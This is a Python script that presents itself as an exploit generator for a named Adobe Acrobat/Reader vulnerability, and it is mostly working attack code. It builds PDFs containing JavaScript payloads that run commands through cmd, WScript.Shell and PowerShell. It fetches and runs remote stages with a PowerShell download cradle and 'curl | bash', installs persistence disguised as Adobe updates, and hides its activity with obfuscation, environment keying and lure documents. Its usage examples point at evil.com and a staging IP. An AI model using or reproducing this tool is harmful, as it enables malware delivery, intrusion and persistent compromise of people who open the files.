#!/usr/bin/env python3
"""
CVE-2026-34621 - Advanced Cross-Platform Exploit Generator
===========================================================
Generates a malicious PDF that exploits Adobe Acrobat/Reader
prototype pollution + sandbox escape vulnerability.

Features:
- OS auto-detection (Windows, macOS, mobile fallback)
- Multiple evasion techniques (obfuscation, keying, delays)
- Staged payloads and fileless execution
- Persistence installation
- Lure PDF merging
- Multiple trigger vectors
- Comprehensive reporting

FOR AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import base64
import json
import os
import random
import re
import string
import sys
import time
from datetime import datetime
from html import escape as html_escape
from textwrap import dedent

print("""

███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░██████╗░░█████╗░░█████╗░  ░█████╗░██╗░░██╗
████╗░██║██║░░░██║██║░░░░░██║░░░░░╚════██╗██╔══██╗██╔══██╗  ██╔══██╗██║░██╔╝
██╔██╗██║██║░░░██║██║░░░░░██║░░░░░░░███╔═╝██║░░██║██║░░██║  ██║░░██║█████═╝░
██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██║░░██║██║░░██║  ██║░░██║██╔═██╗░
██║░╚███║╚██████╔╝███████╗███████╗███████╗╚█████╔╝╚█████╔╝  ╚█████╔╝██║░╚██╗
╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝░╚════╝░░╚════╝░  ░╚════╝░╚═╝░░╚═╝
                NULL200OK 💀🔥created by NABEEL 🔥💀
CVE-2026-34621 - Advanced Cross-Platform Exploit Generator
===========================================================
Generates a malicious PDF that exploits Adobe Acrobat/Reader
prototype pollution + sandbox escape vulnerability.

Features:
- OS auto-detection (Windows, macOS, mobile fallback)
- Multiple evasion techniques (obfuscation, keying, delays)
- Staged payloads and fileless execution
- Persistence installation
- Lure PDF merging
- Multiple trigger vectors
- Comprehensive reporting

FOR AUTHORIZED SECURITY TESTING ONLY.

""")

try:
    from PyPDF2 import PdfReader, PdfWriter
    PYPDF2_AVAILABLE = True
except ImportError:
    PYPDF2_AVAILABLE = False
    print("[!] PyPDF2 not installed. Lure PDF merging will be disabled.", file=sys.stderr)

# ============================================================================
# 1. UTILITIES
# ============================================================================

class RandomUtils:
    """Random generation helpers for polymorphism."""
    
    @staticmethod
    def random_string(length=8, chars=None):
        """Generate a random alphanumeric string."""
        if chars is None:
            chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length))
    
    @staticmethod
    def random_var_name():
        """Generate a random JavaScript variable name."""
        return '_' + RandomUtils.random_string(random.randint(6, 12), string.ascii_lowercase)
    
    @staticmethod
    def random_comment():
        """Generate a random junk comment."""
        comments = [
            "/* performance optimization */",
            "/* debug: " + RandomUtils.random_string(20) + " */",
            "// TODO: refactor",
            "// FIXME: " + RandomUtils.random_string(10),
            "/* " + RandomUtils.random_string(30) + " */",
        ]
        return random.choice(comments)


# ============================================================================
# 2. JAVASCRIPT OBFUSCATOR (Polymorphic, Multi-Level)
# ============================================================================

class JavaScriptObfuscator:
    """
    Apply obfuscation to JavaScript payload.
    Supports multiple levels and polymorphic generation.
    """
    
    def __init__(self, seed=None):
        if seed:
            random.seed(seed)
    
    def obfuscate(self, js_code, level=1, polymorphic=True):
        """
        Obfuscate JavaScript code.
        level: 1 (basic), 2 (intermediate), 3 (advanced)
        polymorphic: if True, uses random elements each run
        """
        if level == 0:
            return js_code
        
        # Level 1: String to char code, variable renaming
        if level >= 1:
            js_code = self._string_to_charcode(js_code)
            if polymorphic:
                js_code = self._rename_variables(js_code)
        
        # Level 2: Dead code injection, comment spam
        if level >= 2:
            js_code = self._inject_dead_code(js_code)
            js_code = self._add_junk_comments(js_code)
        
        # Level 3: Base64 encoding with eval wrapper
        if level >= 3:
            js_code = self._base64_wrap(js_code)
            js_code = self.obfuscate(js_code, level=2, polymorphic=False)  # double obfuscate
        
        return js_code
    
    def _string_to_charcode(self, js_code):
        """Convert string literals to String.fromCharCode() calls."""
        def replacer(match):
            s = match.group(1)
            if len(s) < 3:  # skip short strings
                return match.group(0)
            codes = ','.join(str(ord(c)) for c in s)
            return f'String.fromCharCode({codes})'
        
        # Match double-quoted strings (simple, not perfect but effective)
        pattern = r'"([^"\\]*(\\.[^"\\]*)*)"'
        return re.sub(pattern, replacer, js_code)
    
    def _rename_variables(self, js_code):
        """Replace variable names with random ones."""
        var_pattern = r'\b(var|let|const)\s+([a-zA-Z_$][a-zA-Z0-9_$]*)'
        func_pattern = r'\bfunction\s+([a-zA-Z_$][a-zA-Z0-9_$]*)'
        
        var_names = set(re.findall(var_pattern, js_code))
        func_names = set(re.findall(func_pattern, js_code))
        
        all_names = set()
        for _, name in var_names:
            all_names.add(name)
        all_names.update(func_names)
        
        # Create mapping
        mapping = {}
        for name in all_names:
            if name not in ['app', 'util', 'console', 'Object', 'Array', 'Function',
                            'String', 'ActiveXObject', 'navigator', 'setTimeout',
                            'setInterval', 'eval', 'atob', 'btoa']:
                mapping[name] = self.random_var_name()
        
        # Replace
        for old, new in mapping.items():
            js_code = re.sub(rf'\b{old}\b', new, js_code)
        
        return js_code
    
    def _inject_dead_code(self, js_code):
        """Insert dead code blocks that never execute."""
        dead_blocks = [
            "if(false) { console.log('" + RandomUtils.random_string(10) + "'); }",
            "while(false) { break; }",
            "try { null.toString(); } catch(e) {}",
            "switch(0) { case 1: break; default: break; }",
            "{ let x = '" + RandomUtils.random_string(8) + "'; }",
        ]
        
        lines = js_code.split('\n')
        new_lines = []
        for line in lines:
            new_lines.append(line)
            if random.random() < 0.3 and len(line.strip()) > 0:
                new_lines.append(random.choice(dead_blocks))
        
        return '\n'.join(new_lines)
    
    def _add_junk_comments(self, js_code):
        """Sprinkle random comments."""
        lines = js_code.split('\n')
        new_lines = []
        for line in lines:
            if random.random() < 0.4 and line.strip() and not line.strip().startswith('//'):
                line = random.choice(['// ', '/* ', '']) + RandomUtils.random_string(15) + random.choice([' */', '']) + '\n' + line
            new_lines.append(line)
        return '\n'.join(new_lines)
    
    def _base64_wrap(self, js_code):
        """Encode the entire script in base64 and eval it."""
        encoded = base64.b64encode(js_code.encode()).decode()
        wrapper = f'eval(atob("{encoded}"));'
        return wrapper
    
    @staticmethod
    def random_var_name():
        return '_' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))


# ============================================================================
# 3. PAYLOAD GENERATOR (Cross-Platform, Staged, Persistent)
# ============================================================================

class PayloadGenerator:
    """
    Generate JavaScript payload with OS detection, staging, persistence.
    """
    
    def __init__(self, windows_cmd=None, mac_cmd=None, stage_url=None,
                 persistence=False, delay=0, env_key=None):
        self.windows_cmd = windows_cmd or "calc.exe"
        self.mac_cmd = mac_cmd or "open /System/Applications/Calculator.app"
        self.stage_url = stage_url
        self.persistence = persistence
        self.delay = delay
        self.env_key = env_key  # target hostname/username for keying
    
    def generate(self):
        """Generate the complete JavaScript payload."""
        # Build the core exploit logic
        core_js = self._build_core_exploit()
        
        # Apply environment keying if requested
        if self.env_key:
            core_js = self._apply_environment_keying(core_js)
        
        # Apply delay if requested
        if self.delay > 0:
            core_js = f"setTimeout(function() {{ {core_js} }}, {self.delay * 1000});"
        
        # Wrap in self-executing function with random name for polymorphism
        func_name = JavaScriptObfuscator.random_var_name()
        wrapped = f"""
        (function {func_name}() {{
            {core_js}
        }})();
        """
        return wrapped
    
    def _build_core_exploit(self):
        """Construct the core exploit code with OS branching."""
        
        # Build Windows payload section
        windows_payload = self._build_windows_payload()
        mac_payload = self._build_mac_payload()
        mobile_fallback = self._build_mobile_fallback()
        
        js = f"""
        // CVE-2026-34621 Cross-Platform Exploit
        // Generated: {datetime.now().isoformat()}
        
        // === Prototype Pollution (CVE-2026-34621) ===
        try {{
            Object.prototype.__defineGetter__('__trusted', function() {{ return true; }});
            Object.prototype.constructor.prototype.bypass = true;
            Object.prototype.__proto__.privileged = true;
            Array.prototype.__proto__.polluted = true;
        }} catch(e) {{}}
        
        // === OS Detection ===
        var os = 'unknown';
        try {{
            if (typeof app !== 'undefined' && app.platform) {{
                var pf = app.platform.toLowerCase();
                if (pf.indexOf('win') >= 0) os = 'windows';
                else if (pf.indexOf('mac') >= 0) os = 'macos';
            }}
            if (os === 'unknown' && typeof navigator !== 'undefined') {{
                var ua = navigator.userAgent.toLowerCase();
                if (ua.indexOf('windows') >= 0) os = 'windows';
                else if (ua.indexOf('mac') >= 0) os = 'macos';
                else if (ua.indexOf('android') >= 0) os = 'android';
                else if (ua.indexOf('iphone') >= 0 || ua.indexOf('ipad') >= 0) os = 'ios';
            }}
            // Adobe-specific mobile detection
            if (typeof app !== 'undefined' && app.viewerType) {{
                if (app.viewerType.toLowerCase().indexOf('mobile') >= 0) os = 'android'; // or ios
            }}
        }} catch(e) {{}}
        
        // === OS-Specific Execution ===
        try {{
            if (os === 'windows') {{
                {windows_payload}
            }} else if (os === 'macos') {{
                {mac_payload}
            }} else {{
                {mobile_fallback}
            }}
        }} catch(mainErr) {{}}
        
        // Additional trigger: attempt privileged file read to escalate context
        try {{
            if (typeof util !== 'undefined' && util.readFileIntoStream) {{
                var path = (os === 'windows') ? 'C:\\\\Windows\\\\win.ini' : '/etc/hosts';
                util.readFileIntoStream({{cDIPath: path, bEncodeBase64: true}});
            }}
        }} catch(e) {{}}
        """
        return js
    
    def _build_windows_payload(self):
        """Generate Windows-specific execution chain."""
        methods = []
        
        # Direct command via cmd
        cmd_escaped = self.windows_cmd.replace('\\', '\\\\').replace('"', '\\"')
        methods.append(f'''
        // Method 1: app.launchURL with cmd.exe
        try {{
            app.launchURL('file:///C:/Windows/System32/cmd.exe?/c ' + encodeURIComponent("{cmd_escaped}"), true);
        }} catch(e1) {{}}
        ''')
        
        # WScript.Shell (older Windows)
        methods.append(f'''
        // Method 2: ActiveX WScript.Shell
        try {{
            var shell = new ActiveXObject('WScript.Shell');
            shell.Run("{cmd_escaped}", 0, false);
        }} catch(e2) {{}}
        ''')
        
        # PowerShell (modern, versatile)
        if self.stage_url:
            # Staged download via PowerShell
            ps_cmd = f"powershell -NoP -Ep Bypass -C \"IEX(New-Object Net.WebClient).DownloadString('{self.stage_url}')\""
            methods.append(f'''
            // Method 3: PowerShell staged download
            try {{
                var shell = new ActiveXObject('WScript.Shell');
                shell.Run("{ps_cmd}", 0, false);
            }} catch(e3) {{}}
            ''')
        else:
            # Direct PowerShell execution
            ps_cmd = f"powershell -Command \"{self.windows_cmd}\""
            methods.append(f'''
            // Method 3: PowerShell direct
            try {{
                var shell = new ActiveXObject('WScript.Shell');
                shell.Run("{ps_cmd}", 0, false);
            }} catch(e3) {{}}
            ''')
        
        # Persistence (if enabled)
        if self.persistence:
            persist_cmd = r'powershell -NoP -Ep Bypass -C "$p=\'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\'; Set-ItemProperty -Path $p -Name \'AdobeUpdate\' -Value \'%TEMP%\\updater.exe\'"'
            methods.append(f'''
            // Persistence: registry Run key
            try {{
                var shell = new ActiveXObject('WScript.Shell');
                shell.Run("{persist_cmd}", 0, false);
            }} catch(e_persist) {{}}
            ''')
        
        return '\n'.join(methods)
    
    def _build_mac_payload(self):
        """Generate macOS-specific execution chain."""
        methods = []
        
        # Escape for shell
        mac_cmd_escaped = self.mac_cmd.replace('\\', '\\\\').replace('"', '\\"')
        
        # Terminal.app via file:// URL
        methods.append(f'''
        // Method 1: Terminal via file://
        try {{
            app.launchURL('file:///System/Applications/Utilities/Terminal.app/?' + encodeURIComponent("{mac_cmd_escaped}"), true);
        }} catch(e1) {{}}
        ''')
        
        # osascript URL scheme
        methods.append(f'''
        // Method 2: osascript
        try {{
            var script = 'do shell script "' + "{mac_cmd_escaped}" + '"';
            app.launchURL('osascript://' + encodeURIComponent(script));
        }} catch(e2) {{}}
        ''')
        
        # Staged download via curl
        if self.stage_url:
            curl_cmd = f"curl -s {self.stage_url} | bash"
            methods.append(f'''
            // Method 3: curl pipe to bash
            try {{
                app.launchURL('file:///System/Applications/Utilities/Terminal.app/?' + encodeURIComponent("{curl_cmd}"), true);
            }} catch(e3) {{}}
            ''')
        
        # Persistence: LaunchAgent
        if self.persistence:
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>Label</key><string>com.adobe.update</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>{mac_cmd_escaped}</string></array><key>RunAtLoad</key><true/></dict></plist>"""
            plist_b64 = base64.b64encode(plist.encode()).decode()
            persist_cmd = f"echo '{plist_b64}' | base64 -d > ~/Library/LaunchAgents/com.adobe.update.plist && launchctl load ~/Library/LaunchAgents/com.adobe.update.plist"
            methods.append(f'''
            // Persistence: LaunchAgent
            try {{
                app.launchURL('file:///System/Applications/Utilities/Terminal.app/?' + encodeURIComponent("{persist_cmd}"), true);
            }} catch(e_persist) {{}}
            ''')
        
        return '\n'.join(methods)
    
    def _build_mobile_fallback(self):
        """Mobile demo behavior (since not vulnerable)."""
        return '''
        // Mobile platforms: demo fallback (not vulnerable)
        try {
            app.launchURL('https://www.example.com', true);
            app.alert('Demo: This PDF would exploit CVE-2026-34621 on desktop.');
        } catch(e) {}
        '''
    
    def _apply_environment_keying(self, js_code):
        """Wrap payload with hostname/username check."""
        key_check = f"""
        var targetKey = '{self.env_key}';
        var currentKey = '';
        try {{
            // Try to get hostname
            var shell = new ActiveXObject('WScript.Shell');
            currentKey = shell.ExpandEnvironmentStrings('%COMPUTERNAME%');
        }} catch(e) {{
            try {{
                currentKey = app.runtime.prefManager.getPref('hostname');
            }} catch(e2) {{
                try {{
                    var env = this.getEnvironment();
                    currentKey = env.COMPUTERNAME || env.HOSTNAME;
                }} catch(e3) {{}}
            }}
        }}
        if (currentKey.toUpperCase() === targetKey.toUpperCase()) {{
            {js_code}
        }}
        """
        return key_check


# ============================================================================
# 4. PDF GENERATOR (Pure Python, with Lure Merging)
# ============================================================================

class PDFGenerator:
    """Generate malicious PDF with embedded JavaScript."""
    
    def __init__(self):
        self.objects = []
    
    def build_pdf(self, js_code, lure_pdf_path=None, trigger_vector='openaction'):
        """
        Build PDF with JavaScript payload.
        trigger_vector: 'openaction', 'pageopen', 'doclevel'
        """
        if lure_pdf_path and PYPDF2_AVAILABLE:
            return self._merge_with_lure(lure_pdf_path, js_code, trigger_vector)
        else:
            return self._build_standalone_pdf(js_code, trigger_vector)
    
    def _build_standalone_pdf(self, js_code, trigger_vector):
        """Create a minimal PDF from scratch."""
        pdf = "%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        
        # Object IDs
        catalog_id = 1
        pages_id = 2
        page_id = 3
        contents_id = 4
        js_action_id = 5
        js_script_id = 6
        names_id = 7
        doc_js_id = 8
        
        # JavaScript object
        js_obj = f"{js_script_id} 0 obj\n<< /JS {self._pdf_string(js_code)} /S /JavaScript >>\nendobj\n"
        pdf += js_obj
        
        if trigger_vector == 'doclevel':
            # Document-level JavaScript (via Names dictionary)
            names_obj = f"{names_id} 0 obj\n<< /JavaScript {doc_js_id} 0 R >>\nendobj\n"
            doc_js_obj = f"{doc_js_id} 0 obj\n[ ({js_script_id} 0 R) ]\nendobj\n"
            pdf += names_obj + doc_js_obj
            catalog_extra = f"  /Names {names_id} 0 R\n"
            action_ref = ""
        else:
            # Action object for OpenAction or Page Open
            action_obj = f"{js_action_id} 0 obj\n<< /S /JavaScript /JS {js_script_id} 0 R >>\nendobj\n"
            pdf += action_obj
            if trigger_vector == 'pageopen':
                page_action = f"  /AA << /O {js_action_id} 0 R >>\n"
                action_ref = ""
            else:  # openaction
                page_action = ""
                action_ref = f"  /OpenAction {js_action_id} 0 R\n"
            catalog_extra = action_ref
        
        # Page contents
        contents_obj = f"{contents_id} 0 obj\n<< /Length 100 >>\nstream\nBT /F1 12 Tf 100 700 Td (Loading document...) Tj ET\nendstream\nendobj\n"
        pdf += contents_obj
        
        # Page
        page_obj = f"{page_id} 0 obj\n<< /Type /Page /Parent {pages_id} 0 R /Contents {contents_id} 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >> {page_action if trigger_vector=='pageopen' else ''}>>\nendobj\n"
        pdf += page_obj
        
        # Pages
        pages_obj = f"{pages_id} 0 obj\n<< /Type /Pages /Kids [{page_id} 0 R] /Count 1 >>\nendobj\n"
        pdf += pages_obj
        
        # Catalog
        catalog_obj = f"{catalog_id} 0 obj\n<< /Type /Catalog /Pages {pages_id} 0 R {catalog_extra}>>\nendobj\n"
        pdf += catalog_obj
        
        # Cross-reference and trailer
        xref_offset = len(pdf)
        pdf += f"xref\n0 {max(js_script_id, names_id, doc_js_id, js_action_id)+1}\n0000000000 65535 f \n"
        
        # Calculate offsets (simplified)
        lines = pdf.split('\n')
        offsets = []
        current = 0
        for line in lines:
            if line.endswith(' 0 obj'):
                offsets.append(current)
            current += len(line) + 1
        
        for offset in offsets:
            pdf += f"{offset:010d} 00000 n \n"
        
        pdf += f"trailer\n<< /Size {max(js_script_id, names_id, doc_js_id, js_action_id)+1} /Root {catalog_id} 0 R >>\nstartxref\n{xref_offset}\n%%EOF\n"
        return pdf
    
    def _merge_with_lure(self, lure_path, js_code, trigger_vector):
        """
        Inject JavaScript into an existing PDF using PyPDF2.
        """
        try:
            reader = PdfReader(lure_path)
            writer = PdfWriter()
            
            # Clone all pages
            for page in reader.pages:
                writer.add_page(page)
            
            # Add JavaScript as document-level or OpenAction
            if trigger_vector == 'openaction':
                writer.add_js(js_code)  # PyPDF2 adds as OpenAction
            else:
                # For other vectors, we'd need more advanced injection
                # Fallback to OpenAction
                writer.add_js(js_code)
            
            # Write to bytes
            from io import BytesIO
            output = BytesIO()
            writer.write(output)
            return output.getvalue().decode('latin1')  # Return as string for consistency
        except Exception as e:
            print(f"[!] Lure merging failed: {e}. Generating standalone PDF.", file=sys.stderr)
            return self._build_standalone_pdf(js_code, trigger_vector)
    
    @staticmethod
    def _pdf_string(s):
        """Escape and format as PDF literal string."""
        s = s.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
        return f"({s})"


# ============================================================================
# 5. REPORT GENERATOR (HTML, TXT, JSON)
# ============================================================================

class ReportGenerator:
    """Generate detailed reports about the generated exploit."""
    
    @staticmethod
    def generate_all(pdf_filename, js_payload, config, output_base):
        """Generate HTML, TXT, and JSON reports."""
        html_file = output_base + "_report.html"
        txt_file = output_base + "_report.txt"
        json_file = output_base + "_config.json"
        
        ReportGenerator._generate_html(pdf_filename, js_payload, config, html_file)
        ReportGenerator._generate_txt(pdf_filename, js_payload, config, txt_file)
        ReportGenerator._generate_json(pdf_filename, config, json_file)
        
        return html_file, txt_file, json_file
    
    @staticmethod
    def _generate_html(pdf_filename, js_payload, config, output_file):
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>CVE-2026-34621 Exploit Report</title>
    <style>
        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; background: #f0f2f5; }}
        .container {{ max-width: 1000px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }}
        h1 {{ color: #c62828; border-bottom: 2px solid #eee; padding-bottom: 10px; }}
        h2 {{ color: #2c3e50; margin-top: 30px; }}
        .badge {{ background: #1976d2; color: white; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: bold; }}
        .warning {{ background: #fff3cd; border-left: 5px solid #ffc107; padding: 15px 20px; margin: 20px 0; border-radius: 4px; }}
        pre {{ background: #1e1e1e; color: #d4d4d4; padding: 20px; border-radius: 8px; overflow-x: auto; font-size: 13px; line-height: 1.5; }}
        table {{ border-collapse: collapse; width: 100%; margin: 15px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #f8f9fa; font-weight: 600; }}
        .config-item {{ display: flex; margin-bottom: 8px; }}
        .config-label {{ width: 180px; font-weight: bold; color: #555; }}
        .config-value {{ color: #222; }}
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 CVE-2026-34621 Advanced Exploit Report</h1>
    <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    
    <div class="warning">
        <strong>⚠️ WARNING:</strong> This document describes a weaponized exploit. 
        Use only in authorized penetration testing or research environments. Unauthorized use is illegal.
    </div>

    <h2>📄 Generated PDF</h2>
    <p><strong>Filename:</strong> {html_escape(pdf_filename)}</p>
    
    <h2>⚙️ Configuration</h2>
    <div class="config-item"><span class="config-label">Windows Command:</span> <span class="config-value"><code>{html_escape(config.get('windows_cmd', 'N/A'))}</code></span></div>
    <div class="config-item"><span class="config-label">macOS Command:</span> <span class="config-value"><code>{html_escape(config.get('mac_cmd', 'N/A'))}</code></span></div>
    <div class="config-item"><span class="config-label">Stage URL:</span> <span class="config-value">{html_escape(config.get('stage_url', 'None'))}</span></div>
    <div class="config-item"><span class="config-label">Persistence:</span> <span class="config-value">{config.get('persistence', False)}</span></div>
    <div class="config-item"><span class="config-label">Delay (seconds):</span> <span class="config-value">{config.get('delay', 0)}</span></div>
    <div class="config-item"><span class="config-label">Environment Key:</span> <span class="config-value">{html_escape(config.get('env_key', 'None'))}</span></div>
    <div class="config-item"><span class="config-label">Obfuscation Level:</span> <span class="config-value">{config.get('obfuscation_level', 0)}</span></div>
    <div class="config-item"><span class="config-label">Trigger Vector:</span> <span class="config-value">{config.get('trigger_vector', 'openaction')}</span></div>
    <div class="config-item"><span class="config-label">Lure PDF:</span> <span class="config-value">{html_escape(config.get('lure_pdf', 'None'))}</span></div>

    <h2>🎯 Payload Capabilities</h2>
    <table>
        <tr><th>Platform</th><th>Execution Method</th><th>Status</th></tr>
        <tr><td>Windows</td><td>cmd.exe, PowerShell, WScript.Shell</td><td><span class="badge">Vulnerable</span></td></tr>
        <tr><td>macOS</td><td>Terminal.app, osascript</td><td><span class="badge">Vulnerable</span></td></tr>
        <tr><td>Android / iOS</td><td>Demo behavior only (URL open)</td><td><span class="badge" style="background:#6c757d;">Not Vulnerable</span></td></tr>
    </table>

    <h2>📜 Embedded JavaScript Payload</h2>
    <pre>{html_escape(js_payload)}</pre>

    <h2>🔬 Technical Details</h2>
    <ul>
        <li><strong>CVE:</strong> 2026-34621</li>
        <li><strong>Vulnerability Type:</strong> Prototype Pollution → Sandbox Escape → Arbitrary Code Execution</li>
        <li><strong>Affected Software:</strong> Adobe Acrobat/Reader (Desktop) on Windows/macOS</li>
        <li><strong>Patch Versions:</strong> 26.001.21411 (Continuous), 24.001.30362 (Classic 2024)</li>
    </ul>

    <p style="margin-top: 30px; color: #777; font-size: 0.9em;">Report generated by CVE-2026-34621 Advanced Exploit Generator</p>
</div>
</body>
</html>
"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
    
    @staticmethod
    def _generate_txt(pdf_filename, js_payload, config, output_file):
        txt = f"""CVE-2026-34621 ADVANCED EXPLOIT REPORT
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
PDF File: {pdf_filename}

CONFIGURATION
-------------
Windows Command: {config.get('windows_cmd', 'N/A')}
macOS Command:   {config.get('mac_cmd', 'N/A')}
Stage URL:       {config.get('stage_url', 'None')}
Persistence:     {config.get('persistence', False)}
Delay:           {config.get('delay', 0)} seconds
Environment Key: {config.get('env_key', 'None')}
Obfuscation:     Level {config.get('obfuscation_level', 0)}
Trigger Vector:  {config.get('trigger_vector', 'openaction')}
Lure PDF:        {config.get('lure_pdf', 'None')}

EMBEDDED JAVASCRIPT
-------------------
{js_payload}

TECHNICAL NOTES
---------------
- CVE-2026-34621 is a prototype pollution vulnerability in Adobe Acrobat/Reader.
- This exploit targets desktop versions on Windows and macOS.
- Mobile platforms are not vulnerable and receive a demo fallback.
- Obfuscation and environment keying are applied as configured.

WARNING: For authorized security testing only.
"""
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(txt)
    
    @staticmethod
    def _generate_json(pdf_filename, config, output_file):
        data = {
            "generated": datetime.now().isoformat(),
            "pdf_filename": pdf_filename,
            "configuration": config,
            "cve": "CVE-2026-34621",
            "description": "Adobe Acrobat/Reader Prototype Pollution Sandbox Escape"
        }
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)


# ============================================================================
# 6. MAIN CLI
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2026-34621 Advanced Cross-Platform Exploit Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic calc popup
  python %(prog)s -o malicious.pdf

  # Staged payload with persistence and obfuscation
  python %(prog)s -o invoice.pdf --win "calc.exe" --stage http://10.0.0.5/payload.ps1 -p -O 2

  # Environment-keyed, delayed execution with lure PDF
  python %(prog)s -o contract.pdf --mac "curl http://evil.com/script.sh | bash" -k "WORKSTATION01" -d 10 -l template.pdf

  # Use page-open trigger instead of OpenAction
  python %(prog)s -o doc.pdf --trigger pageopen
        """
    )
    
    # Required
    parser.add_argument('-o', '--output', required=True, help='Output PDF filename')
    
    # Payload options
    parser.add_argument('--win', default='calc.exe', help='Windows command to execute')
    parser.add_argument('--mac', default='open /System/Applications/Calculator.app', help='macOS command')
    parser.add_argument('--stage', help='URL for staged payload download (PS1 for Windows, shell script for macOS)')
    parser.add_argument('-p', '--persistence', action='store_true', help='Install persistence mechanism')
    
    # Evasion options
    parser.add_argument('-O', '--obfuscate', type=int, choices=[0,1,2,3], default=0,
                       help='JavaScript obfuscation level (0=none, 3=max)')
    parser.add_argument('-d', '--delay', type=int, default=0, help='Delay execution in seconds')
    parser.add_argument('-k', '--key', help='Environment key (hostname/username) - only execute if matches')
    
    # PDF options
    parser.add_argument('-l', '--lure', help='Path to legitimate PDF to use as lure')
    parser.add_argument('--trigger', choices=['openaction', 'pageopen', 'doclevel'], default='openaction',
                       help='JavaScript trigger vector (default: openaction)')
    
    # Output options
    parser.add_argument('--no-reports', action='store_true', help='Skip generating HTML/TXT/JSON reports')
    parser.add_argument('--seed', type=int, help='Random seed for reproducible generation')
    
    args = parser.parse_args()
    
    # Set random seed if provided
    if args.seed:
        random.seed(args.seed)
    
    # Build configuration dictionary for reporting
    config = {
        'windows_cmd': args.win,
        'mac_cmd': args.mac,
        'stage_url': args.stage,
        'persistence': args.persistence,
        'delay': args.delay,
        'env_key': args.key,
        'obfuscation_level': args.obfuscate,
        'trigger_vector': args.trigger,
        'lure_pdf': args.lure
    }
    
    print("[*] CVE-2026-34621 Advanced Exploit Generator")
    print(f"[*] Output PDF: {args.output}")
    print(f"[*] Windows command: {args.win}")
    print(f"[*] macOS command: {args.mac}")
    if args.stage:
        print(f"[*] Stage URL: {args.stage}")
    if args.persistence:
        print("[*] Persistence: Enabled")
    if args.key:
        print(f"[*] Environment key: {args.key}")
    if args.obfuscate > 0:
        print(f"[*] Obfuscation level: {args.obfuscate}")
    if args.lure:
        print(f"[*] Lure PDF: {args.lure}")
        if not PYPDF2_AVAILABLE:
            print("[!] PyPDF2 not installed. Lure merging disabled. Install with: pip install PyPDF2")
    
    # Step 1: Generate base payload
    print("[*] Generating cross-platform payload...")
    payload_gen = PayloadGenerator(
        windows_cmd=args.win,
        mac_cmd=args.mac,
        stage_url=args.stage,
        persistence=args.persistence,
        delay=args.delay,
        env_key=args.key
    )
    js_payload = payload_gen.generate()
    
    # Step 2: Apply obfuscation
    if args.obfuscate > 0:
        print(f"[*] Applying obfuscation level {args.obfuscate}...")
        obfuscator = JavaScriptObfuscator(seed=args.seed)
        js_payload = obfuscator.obfuscate(js_payload, level=args.obfuscate)
    
    # Step 3: Build PDF
    print("[*] Building PDF...")
    pdf_gen = PDFGenerator()
    pdf_content = pdf_gen.build_pdf(
        js_code=js_payload,
        lure_pdf_path=args.lure,
        trigger_vector=args.trigger
    )
    
    # Write PDF
    mode = 'wb' if isinstance(pdf_content, bytes) else 'w'
    encoding = None if isinstance(pdf_content, bytes) else 'utf-8'
    with open(args.output, mode, encoding=encoding) as f:
        f.write(pdf_content)
    
    print(f"[✓] PDF generated: {args.output} ({len(pdf_content)} bytes)")
    
    # Step 4: Generate reports
    if not args.no_reports:
        print("[*] Generating reports...")
        base_name = os.path.splitext(args.output)[0]
        html_file, txt_file, json_file = ReportGenerator.generate_all(
            args.output, js_payload, config, base_name
        )
        print(f"[✓] HTML report: {html_file}")
        print(f"[✓] TXT report: {txt_file}")
        print(f"[✓] JSON config: {json_file}")
    
    print("\n[✓] Done!")
    print("[!] REMINDER: This exploit is for authorized security testing only.")
    print("[!] Ensure you have explicit permission before use.")


if __name__ == '__main__':
    main()
